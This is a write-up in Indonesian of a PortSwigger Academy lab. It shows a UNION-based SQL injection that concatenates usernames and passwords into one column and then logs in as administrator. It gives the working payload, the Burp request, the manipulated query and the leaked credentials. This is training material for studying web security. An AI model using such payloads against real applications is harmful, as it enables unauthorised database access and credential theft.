# [PortSwigger Academy] SQL Injection - Lab #10

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection UNION attack, retrieving multiple values in a single column
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menggunakan serangan UNION-Based SQLi untuk mengekstrak data username dan password dari tabel `users` ketika hanya ada satu kolom teks yang tersedia, lalu login sebagai `administrator`.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Melalui tahapan pengujian awal dengan `ORDER BY` dan `UNION SELECT NULL`, ditemukan bahwa kueri asli mengembalikan **2 kolom**, tetapi setelah diuji tipe datanya, **hanya ada 1 kolom yang bertipe teks (String)**, yaitu kolom kedua. 

Karena kita harus mengambil dua nilai data (`username` dan `password`) tetapi hanya bisa menampilkannya di satu kolom teks, kita harus menggabungkan kedua nilai tersebut menggunakan sintaks penggabungan string (*String Concatenation*) yang sesuai dengan jenis database target. Kita juga akan menyisipkan karakter pembatas seperti titik dua (`:`) atau tilde (`~`) sebagai pemisah.

### Sintaks Penggabungan String Berdasarkan DBMS:
* **PostgreSQL / Oracle:** `username || '~' || password`
* **MySQL:** `CONCAT(username, '~', password)`
* **Microsoft (MSSQL):** `username + '~' + password`

*(Catatan: Lab ini menggunakan database **PostgreSQL**)*

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Injeksi Payload dengan String Concatenation
Suntikkan perintah penggabungan string menggunakan operator `||` pada posisi kolom kedua (kolom yang menerima tipe data teks), sedangkan kolom pertama diisi dengan nilai `NULL`:

* **Payload:** `' UNION SELECT NULL, username || '~' || password FROM users--`

Request HTTP final di Burp Repeater:
```http
GET /filter?category=Gifts' UNION SELECT NULL, username ||'~'|| password FROM users-- HTTP/2
Host: 0ad9009403bc07e6836ffa40006b00fe.web-security-academy.net
```

### Hasil Eksekusi Database
Di sisi database backend, kueri dimanipulasi secara penuh menjadi:
```
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username || '~' || password FROM users--' AND released = 1
```

### Analisis Hasil Eksstraksi
Setelah request dikirim, periksa respons HTML yang dikembalikan oleh aplikasi web. Data username dan password berhasil muncul di halaman dalam satu baris teks yang dipisahkan oleh karakter tilde (~):
```
<tr>
    <th>administrator~vk5qa6e480l8wje2d3xi</th>
</tr>
```
Hasil Akhir: Identifikasi baris yang mengandung teks administrator, pisahkan password-nya (vk5qa6e480l8wje2d3xi), lalu gunakan kredensial tersebut untuk login ke sistem. Lab berhasil diselesaikan (Solved).